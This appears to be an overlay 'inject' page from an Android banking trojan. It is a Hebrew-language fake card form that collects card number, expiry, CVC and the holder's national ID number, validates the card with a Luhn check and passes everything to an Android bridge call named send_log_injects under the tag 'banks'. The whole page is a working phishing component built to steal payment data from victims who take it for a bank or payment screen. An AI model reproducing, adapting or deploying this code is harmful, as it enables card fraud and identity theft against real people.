    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js"></script>

    <style>
        * {
            padding: 0;
            margin: 0;
            box-sizing: border-box;
        }

        .cool-input {
            box-sizing: border-box;
            border: 0;
            width: 100%;
            position: relative;
            font-size: 16px;
            margin-bottom: 15px;
        }

        .cool-input__input {
            box-sizing: border-box;
            background: none;
            width: 100%;
            padding: 10px;
            padding-left: 0;
            position: relative;
            z-index: 2;
            font-size: 1em;
        }
        .cool-input__input:focus {
            outline: none;
        }

        .cool-input__placeholder {
            box-sizing: border-box;
            border: none;
            background: none;
            width: 100%;
            position: absolute;
            z-index: 1;
            left:0;
            top: 50%;
            line-height: 0;
            color: #a0a09d;
            transition: all 0.2s ease;
            direction: rtl;
            text-align: right;
        }

        .cool-input__input_filled + .cool-input__placeholder,
        .cool-input__input:focus + .cool-input__placeholder {
            font-size: 0.8em;
            top: 0;
            margin-top: -0.5em;
        }

        .input {
            width: 100%;
            padding: 5px;
            border: 0;
            border-bottom: 1px solid #a0a09d;
            text-align: right;
            color: #696966;
            font-weight: 600;
            font-size: 18px;
            margin-bottom: 15px;
        }

        section {
            padding: 20px;
        }

        .submit {   
            display: block;
            margin: 0 auto;
            padding: 5px 40px;
            background-color: transparent;
            border: 2px solid #d53c4b;
            color: #d53c4b;
            font-weight: 600;
            border-radius: 75px;
        }   

        .submit:disabled {   
            border: 2px solid #9e9e9e;
            color: #9e9e9e;
        }   

input,button {
    outline: none !important;
    box-shadow: none !important;
}
    </style>
</head>

    <section>
        <form onsubmit="return false">
            <div class="cool-input">
                <input type="tel" id="number" name="number" onkeyup="check()" class="input cool-input__input" required autocomplete="off">
                <span class="cool-input__placeholder">מספר הכרטיס</span>
            </div>

            <div class="cool-input">
                <input type="tel" id="exp" name="exp" onkeyup="check()" disabled class="input cool-input__input" required autocomplete="off">
                <span class="cool-input__placeholder">תוקף (MM / YY)</span>
            </div>
            
            <div class="cool-input">
                <input type="password" id="cvc" name="cvc" pattern="^[0-9]{3,4}$" disabled maxlength="3" onkeyup="check()" class="input cool-input__input" required autocomplete="off">
                <span class="cool-input__placeholder">ספרות בגב הכרטיס</span>
            </div>
            
            <div class="cool-input">
                <input type="tel" id="id" name="id" pattern=".{8,}" onkeyup="check()" disabled class="input cool-input__input" required autocomplete="off">
                <span class="cool-input__placeholder">מספר ת"ז של בעל הכרטיס</span>
            </div>

            <input type="hidden" name="exit">
            <button class="submit" id="sendData" disabled>המשר</button>
        </form>
    </section>

    <script type="text/javascript">
        $('.cool-input__input').on('input', function(){
            var $this = $(this);
            if ($this.val() == '') {
                $this.removeClass('cool-input__input_filled');
            } else {
                $this.addClass('cool-input__input_filled');
            }
        });

        var btn_finish = document.getElementById('sendData');

        function check() {
            var cardField = $('#number').val(),
                exp = document.getElementById('exp'),
                cvc = document.getElementById('cvc'),
                id = document.getElementById('id'),
                cardField = cardField.replace(/\s+/g,'');
                $('#number').mask('0000 0000 0000 0000');
                $('#exp').mask('00/00');


            if(!Moon(cardField)) {
                btn_finish.disabled = true;
            } else {
                exp.disabled = false
                exp.focus()
            }
            
            if (exp.value.length < 5) {
                btn_finish.disabled = true;
            } else {
                cvc.disabled = false
                cvc.focus()
            }
            
            if (cvc.value.length < 3) {
                btn_finish.disabled = true;
            } else {
                id.disabled = false
                id.focus()
            }
            
            if (id.value.length < 8) {
                btn_finish.disabled = true;
            } else {
                btn_finish.disabled = false;
            }

            btn_finish.onclick = function(){
                var data = {};
                data.cardField = cardField.value;
                data.exp = exp.value;
                data.cvc = cvc.value;
                data.id = id.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
            }

        }

function Moon(card_number) {
card_length = card_number.length;
if(card_length == '0') return false;
if(card_length < '16') return false;
  var arr = [],
      card_number = card_number.toString();
  for(var i = 0; i < card_number.length; i++) {
    if(i % 2 === 0) {
      var m = parseInt(card_number[i]) * 2;
      if(m > 9) {
        arr.push(m - 9);
      } else {
        arr.push(m);
      } 
    } else {
        var n = parseInt(card_number[i]);
        arr.push(n)
      }
  }
  //console.log(arr);
  var summ = arr.reduce(function(a, b) { return a + b; });
  return Boolean(!(summ % 10));

}     
</script>
